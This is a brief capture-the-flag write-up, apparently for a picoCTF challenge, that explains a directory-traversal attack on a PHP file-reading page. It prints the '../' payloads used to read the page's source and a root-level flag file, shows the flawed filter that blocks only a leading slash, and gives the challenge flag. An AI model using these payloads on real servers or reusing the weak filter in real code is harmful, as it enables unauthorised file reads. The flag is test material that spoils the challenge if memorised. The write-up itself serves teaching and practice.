This problem is on the easier side. If we type in any random file and hit enter, we see that it redirects us to the `/read.php` page. 

It doesn't matter if the file is valid or gibberish because the redirect link is always `/read.php`. This means that it must be processing our input live.

Thus entering something like:

    ../../../../usr/share/nginx/html/read.php
will provide us the source code for read.php file:

    $firstChar = $_POST['filename'][0];
    if( strcmp($firstChar, '/') == 0 ){
    echo "Not Authorized";}
    else {
    if (file_exists($_POST['filename'])) {
    $file = fopen($_POST['filename'], 'r');
    while(! feof($file)){
    $line = fgets($file);
    echo $line. "
    ";}
    fclose($file);
    } else {
    echo "File does not exist";}}?> 

The filter is that any filename starting with a `/` is unauthorised. Thus, we can do directory transversal using dots first. To get the flag from the root directory:

    ../../../../../flag.txt

flag: `picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}`
